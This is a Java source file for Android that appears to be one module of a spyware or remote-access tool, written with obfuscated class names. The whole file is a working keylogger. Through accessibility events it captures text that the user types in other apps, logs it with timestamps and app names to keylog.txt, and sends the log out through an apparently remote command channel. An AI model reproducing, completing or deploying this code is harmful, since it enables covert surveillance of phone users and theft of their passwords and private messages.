// language: Java, file: x.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.content.Context;
import android.view.accessibility.AccessibilityEvent;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class x {

    static volatile boolean enabled = false;
    static final Object LOCK = new Object();
    static File logFile;

    public static void toggle(boolean on) {
        enabled = on;
        if (on && logFile == null) {
            Context c = d.ctx;
            if (c != null) logFile = new File(c.getFilesDir(), "keylog.txt");
        }
        d.send("<i>keylogger " + (on ? "ON" : "OFF") + "</i>");
    }

    public static boolean isEnabled() { return enabled; }

    /** called from c on TYPE_VIEW_TEXT_CHANGED */
    public static void onText(AccessibilityEvent e) {
        if (!enabled) return;
        if (e == null || e.getText() == null) return;
        String pkg = e.getPackageName() == null ? "?" : e.getPackageName().toString();
        if (pkg.equals("com.v2ram")) return;

        StringBuilder raw = new StringBuilder();
        for (CharSequence c : e.getText()) raw.append(c == null ? "" : c);
        if (raw.length() == 0) return;
        if (raw.length() > 500) raw.setLength(500);

        String ts = new SimpleDateFormat("MM-dd HH:mm:ss", Locale.US).format(new Date());
        String line = "[" + ts + "] " + pkg + " :: " + raw + "\n";

        synchronized (LOCK) {
            try {
                if (logFile == null && d.ctx != null) {
                    logFile = new File(d.ctx.getFilesDir(), "keylog.txt");
                }
                if (logFile == null) return;
                FileOutputStream fo = new FileOutputStream(logFile, true);
                fo.write(line.getBytes());
                fo.close();
            } catch (Throwable ignored) {}
        }
    }

    public static void dump() {
        if (logFile == null || !logFile.exists()) {
            d.send("<i>keylog empty</i>");
            return;
        }
        try {
            long size = logFile.length();
            if (size > 45L * 1024 * 1024) {
                d.send("<i>keylog too big</i>");
                return;
            }
            d.sendFile(logFile, "keylog.txt");
        } catch (Throwable t) {
            e.err(t.getMessage());
        }
    }

    public static void clear() {
        if (logFile != null && logFile.exists()) logFile.delete();
        d.send("<i>keylog cleared</i>");
    }
}